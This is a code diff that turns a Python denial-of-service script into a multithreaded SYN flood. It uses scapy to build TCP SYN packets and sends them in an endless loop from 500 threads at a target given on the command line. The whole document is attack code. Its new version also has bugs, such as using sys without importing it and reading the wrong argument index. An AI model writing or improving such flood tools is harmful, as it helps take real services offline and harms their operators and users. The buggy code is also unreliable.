@@ -1,66 +1,38 @@
-import sys
+# Import socket and tcp packet modules
 import socket
 import threading
-import time
-import signal
-from signal import SIGINT
+from scapy.all import IP, TCP  
 
-p_num = 0
-successful_packets = 0 
-failed_packets = 0
-mutex = threading.Lock()
+# SYN flood attack function
+def syn_flood(target, port, threads):
 
-def print_stats():
-  time.sleep(1)
-  with mutex:
-    print("\n\nAttack Summary:")
-    print("PACKETS: {}  Successful: {} Failed: {}".format(p_num, successful_packets, failed_packets))
-    print("Attack Time: {} seconds".format(time_diff))
-    sys.exit(0)
+  print("Starting SYN flood on", target, "using", threads, "threads")
 
-def attack(target_ip, port):
-  global p_num, successful_packets, failed_packets, mutex, time_diff
-  
-  signal(SIGINT, print_stats)
+  # Craft SYN packet
+  ip = IP(dst=target)
+  tcp = TCP(sport=1234, dport=port, flags='S')
+  packet = ip/tcp
 
   while True:
-    try:
-      # Craft packet
-      sock.sendto(packet, (target_ip, port))
-      with mutex:
-        p_num += 1
-        successful_packets += 1
-        if p_num == 1:
-          print("[+] Attack started!")
-    except:
-      with mutex:
-        failed_packets += 1
+    # Send SYN packet
+    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+    sock.sendto(bytes(packet), (target, port))
 
-if len(sys.argv) != 2:
-  print("Usage: python syn.py <target>")
-  sys.exit(1)
+# Input handling 
 
+# Get target and port
 target = sys.argv[1]
-
-try:
-  target_ip = socket.gethostbyname(target) 
-except socket.gaierror:
-  print("Unable to resolve target IP")
-  sys.exit(1)
-
-print("Target IP:", target_ip)
 port = 80
 
-threads = num_threads = int(input("Number of threads: "))
-time_diff = 0
+# Get thread count
+threads = 500  
+if len(sys.argv) > 2:
+  threads = int(sys.argv[3])
 
-start_time = time.time()
+# Resolve target DNS name
+target_ip = socket.gethostbyname(target)
 
-for _ in range(num_threads):
-  thread = threading.Thread(target=attack, args=(target_ip, port))
-  thread.daemon = True
+# Launch SYN flood threads 
+for _ in range(threads):
+  thread = threading.Thread(target=syn_flood, args=(target_ip, port, threads))
   thread.start()
-
-while True:
-  time.sleep(1)
-  time_diff = time.time() - start_time
